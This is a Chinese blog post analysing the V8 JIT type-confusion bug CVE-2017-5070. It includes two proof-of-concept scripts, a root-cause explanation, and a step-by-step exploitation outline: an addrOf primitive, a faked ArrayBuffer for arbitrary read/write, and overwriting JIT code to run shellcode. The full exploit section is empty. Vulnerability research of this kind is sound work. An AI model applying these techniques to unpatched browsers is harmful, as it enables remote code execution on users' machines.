---
layout:     post
title:      "V8引擎CVE-2017-5070漏洞分析（工事中）"
subtitle:   ""
date:       2019-08-02 10:30:00
author:     "GToad"
header-img: "img/android-five.png"
catalog: true
tags:
    - chrome
    - v8
    - exploit
    - cve
    - browser
---

> 本文为本博客V8系列第三篇。

## 漏洞基本信息

[漏洞信息页面](https://bugs.chromium.org/p/chromium/issues/detail?id=722756)
[漏洞修复代码](https://chromium.googlesource.com/v8/v8.git/+/e33fd30777f99a0d6e16b16d096a2663b1031457)

根据漏洞基本信息可准备分析环境，先切换至漏洞修复前版本。
```
git checkout 9a493631005539cdabb7366352e8dd8188141a80
gclient sync
```

对源码进行编译。
```
tools/dev/v8gen.py x64.debug
ninja -C out.gn/x64.debug d8
```

## PoC

参考了如下两个POC：

```javascript
var array = [[{}], [1.1]];
var double_arr2 = [1.1,2.2];
function transition() {
  for(var i = 0; i < array.length; i++){
    var arr = array[i];
    arr[0] = {};
  }

}

var flag = 0;
function swap() {
  try {} catch(e) {}  // Prevent Crankshaft from inlining this.
  if (flag == 1) {
    array[1] = double_arr2;
  }
}
var expected = 6.176516726456e-312;
function f(){
  Math.sin(1);
  swap();  
  double_arr2[0] = 1;
  transition(); 
  double_arr2[1] = expected; 
  
}
%DebugPrint(double_arr2);
f();
%OptimizeFunctionOnNextCall(f);
flag = 1;
f();

print ("111");
print (expected === double_arr2[1]);
print ("222")
```

第二个是大佬大宝的：

```javascript
var array = [[{}], [1.1]];

function transition() {
  for(var i = 0; i < array.length; i++){
    var arr = array[i];
    arr[0] = {};
  }
}

var double_arr2 = [1.1,2.2];

var flag = 0;
function swap() {
  try {} catch(e) {}  // Prevent Crankshaft from inlining this.
  if (flag == 1) {
    array[1] = double_arr2;
  }
}

var expected = 6.176516726456e-312;
function f(){
  swap();
  double_arr2[0] = 1;
  transition();
  double_arr2[1] = expected;
}

// %OptimizeFunctionOnNextCall(f);
for(var i = 0; i < 0x10000; i++) {
  f();
}
flag = 1;
f();
assertEquals(expected, double_arr2[1]);
```

分别使用这两个POC对漏洞版本v8进行测试，可能第一个POC更加容易理解，该POC代码执行后会在倒数第二行的代码处报错，最后一行的输出并不会执行，原因是对double_arr2的解析会报错。

## 漏洞成因

#### 调试分析

本漏洞在gdb调试时可能出现数据无法正常读出的情况，因此，需要使用gdb的attach功能，大致方法如下：

1. 在一个terminal中运行测试脚本：`gdb d8 --allow-natives-syntax ./test.js`，脚本中的`%SystemBreak();`全都换成`readline();`这样脚本会停在readline这里等用户输入并回车。
2. 在另一个terminal里用`ps -uf`命令查看步骤1中的进程号，然后用sudo gdb d8（一定要sudo！），进入后用attach 进程号来调试这个进程，attach上以后记得先用stop命令让进程暂停下来。

#### 结论

那么仔细看一下本漏洞的大致原理是什么呢？关键在于transition和swap这两个函数。

swap函数不仅仅是需要JIT优化，还要防止自己因为过短而被inline进f()。

transition这个函数看似没有对我们的array和double_arr2进行任何改变，仅仅只修改了局部变量arr。但是，这只是代码表面现象，实际上v8会对array中的两个元素进行优化调整。并且这个优化调整还会在flag=1时在swap中涉及到double_arr。

最后由于执行次数太多，swap和transition会进行JIT优化并去除一些类型检查。最终的效果就是double_arr2在访问时会直接把自己的元素上保存的数据当作double值给直接返回出来，而不是正常情况下把它们作为double对象的指针去寻找目标内存中下一个的数据作为double来返回。

根据上面的分析，这个漏洞最后的表现为：由于double_arr2开始直接把自己元素的指针当作double来返回了，所以在f()里直接对double_arr2进行object赋值，这样访问double_arr后就能直接得到object的地址了。于是这就是个任意地址读的原语addrOf（object），这里并没有暴露出很明显的fakeObject原语。

## 漏洞利用

#### 步骤一

第一步，我们先创建了一个`var ab = new ArrayBuffer(0x20);`。

然后用addrOf原语泄露出ab.__proto__的地址，这个地址就是%DebugPrint（ab）中包含的prototype的地址。并且通过-0x70就可以得到ab_constructor_addr的地址。

#### 步骤二

第二步，新建ab_map_obj变量，是个uint32，总共12个int32或6个int64的数组：
```javascript
var ab_map_obj = [
    nop,nop,
    0x1f000008,0x000900c0,0x082003ff,0x0,
    nop,nop,   // use ut32.prototype replace it
    nop,nop,0x0,0x0
];
```

然后对其中的`[6,7,8,9]`进行赋值，把第一步得到的ab_proto_addr和ab_constructor_addr两个64位数据给了这4个32位。

接下来新建`var ab_map_obj_float = [1.1,1.1,1.1,1.1,1.1,1.1];`长度为6的double64数组。使用工具函数change_to_float把ab_map_obj里的12个int32都赋值给 ab_map_obj_float。通过addrOf原语得到 ab_map_obj_float的地址，然后+0x40就是这6个float64数据的存储位置，这6个数据现在伪装成了一个arraybuffer的map。

#### 步骤三

第三步，新建两个变量：（和第二步差不多）
var fake_ab = [
    ab_map_obj_addr & 0xffffffff, ab_map_obj_addr / 0x100000000,
    ab_map_obj_addr & 0xffffffff, ab_map_obj_addr / 0x100000000,
    ab_map_obj_addr & 0xffffffff, ab_map_obj_addr / 0x100000000,
    0x0,0x4000, // buffer length 
    0x12345678,0x123,// buffer address
    0x4,0x0
]
var fake_ab_float = [1.1,1.1,1.1,1.1,1.1,1.1];
把fake_ab的数据也保存进fake_ab_float，然后用原语泄露地址。最后通过+0x40来获得6个float64数据的位置。这6个数据现在已经伪装成一个arraybuffer了。

#### 步骤四

第四步，本步骤在double_arr42[1]上保存上步得到的fake_ab_float_addr的数据。于是再次从double_arr42[1]上取出来时，已经是一个假的arraybuffer了，赋值给fake_arraybuffer。
此时，我们既可以用fake_ab_float来任意修改这6个float64数据，同时这6个float64数据也被认为是个arraybuffer，其中因此通过修改backing store属性就可以进行任意读写。

#### 步骤五-七

第五步，本步骤用原语得到了function_to_shellcode函数对象的地址，并通过+0x38得到code对象的位置。

第六步，用任意读能力从code属性得到函数的汇编地址。

第七步，把汇编地址存入backing store，接下来就可以改写函数汇编代码了，之后执行这个函数就行。

## 最终效果

执行该exploit后可以成功执行shellcode并弹出计算器：

![](/img/in-post/post-cve20165198/calc.png)

## 完整EXP

```javascript

```